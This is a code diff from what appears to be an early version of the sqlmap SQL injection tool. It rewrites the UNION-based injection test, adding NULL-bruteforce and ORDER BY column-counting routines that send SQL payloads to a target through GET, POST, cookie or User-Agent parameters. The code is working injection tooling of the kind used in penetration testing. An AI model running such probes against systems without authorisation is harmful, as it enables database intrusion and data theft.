@@ -33,14 +33,34 @@ from lib.core.session import setUnion
 from lib.request.connect import Connect as Request
 
 
-def __effectiveUnionTest(query, comment):
+def __forgeUserFriendlyValue(payload):
+    value = ""
+
+    if kb.injPlace == "GET":
+        value = "%s?%s" % (conf.url, payload)
+    elif kb.injPlace == "POST":
+        value  = "URL:\t'%s'" % conf.url
+        value += "\nPOST:\t'%s'\n" % payload
+    elif kb.injPlace == "Cookie":
+        value  = "URL:\t'%s'" % conf.url
+        value += "\nCookie:\t'%s'\n" % payload
+    elif kb.injPlace == "User-Agent":
+        value  = "URL:\t\t'%s'" % conf.url
+        value += "\nUser-Agent:\t'%s'\n" % payload
+
+    return value
+
+
+def __unionTestByNULLBruteforce(comment):
     """
     This method tests if the target url is affected by an inband
     SQL injection vulnerability. The test is done up to 50 columns
     on the target database table
     """
 
-    resultDict = {}
+    columns = None
+    value   = None
+    query   = agent.prefixQuery(" UNION ALL SELECT NULL")
 
     for count in range(0, 50):
         if kb.dbms == "Oracle" and query.endswith(" FROM DUAL"):
@@ -53,32 +73,38 @@ def __effectiveUnionTest(query, comment):
             query += " FROM DUAL"
 
         commentedQuery = agent.postfixQuery(query, comment)
-        payload = agent.payload(newValue=commentedQuery)
-        newResult = Request.queryPage(payload, getSeqMatcher=True)
+        payload        = agent.payload(newValue=commentedQuery)
+        seqMatcher     = Request.queryPage(payload, getSeqMatcher=True)
 
-        if not newResult in resultDict.keys():
-            resultDict[newResult] = (1, commentedQuery)
-        else:
-            resultDict[newResult] = (resultDict[newResult][0] + 1, commentedQuery)
+        if seqMatcher >= 0.6:
+            columns = count + 1
+            value   = __forgeUserFriendlyValue(payload)
 
-        if count > 3:
-            for ratio, element in resultDict.items():
-                if element[0] == 1 and ratio > 0.5:
-                    if kb.injPlace == "GET":
-                        value = "%s?%s" % (conf.url, element[1])
-                    elif kb.injPlace == "POST":
-                        value  = "URL:\t'%s'" % conf.url
-                        value += "\nPOST:\t'%s'\n" % element[1]
-                    elif kb.injPlace == "Cookie":
-                        value  = "URL:\t'%s'" % conf.url
-                        value += "\nCookie:\t'%s'\n" % element[1]
-                    elif kb.injPlace == "User-Agent":
-                        value  = "URL:\t\t'%s'" % conf.url
-                        value += "\nUser-Agent:\t'%s'\n" % element[1]
+            break
 
-                    return value
+    return value, columns
 
-    return None
+
+def __unionTestByOrderBy(comment):
+    columns = None
+    value   = None
+
+    for count in range(1, 51):
+        query        = agent.prefixQuery(" ORDER BY %d" % count)
+        orderByQuery = agent.postfixQuery(query, comment)
+        payload      = agent.payload(newValue=orderByQuery)
+        seqMatcher   = Request.queryPage(payload, getSeqMatcher=True)
+
+        if seqMatcher >= 0.6:
+            columns = count
+        elif columns:
+            value = __forgeUserFriendlyValue(prevPayload)
+
+            break
+
+        prevPayload = payload
+
+    return value, columns
 
 
 def unionTest():
@@ -87,19 +113,29 @@ def unionTest():
     SQL injection vulnerability. The test is done up to 3*50 times
     """
 
+    if conf.uTech == "ob":
+        technique = "ORDER BY clause"
+    else:
+        technique = "NULL bruteforcing"
+
     logMsg  = "testing inband sql injection on parameter "
-    logMsg += "'%s'" % kb.injParameter
+    logMsg += "'%s' with %s technique" % (kb.injParameter, technique)
     logger.info(logMsg)
 
-    value = ""
-
-    query = agent.prefixQuery(" UNION ALL SELECT NULL")
+    value   = ""
+    columns = None
 
     for comment in (queries[kb.dbms].comment, ""):
-        value = __effectiveUnionTest(query, comment)
+        if conf.uTech == "ob":
+            value, columns = __unionTestByOrderBy(comment)
+        else:
+            value, columns = __unionTestByNULLBruteforce(comment)
 
-        if value:
-            setUnion(comment, value.count("NULL"))
+        print value
+        print columns
+
+        if columns:
+            setUnion(comment, columns)
 
             break
 
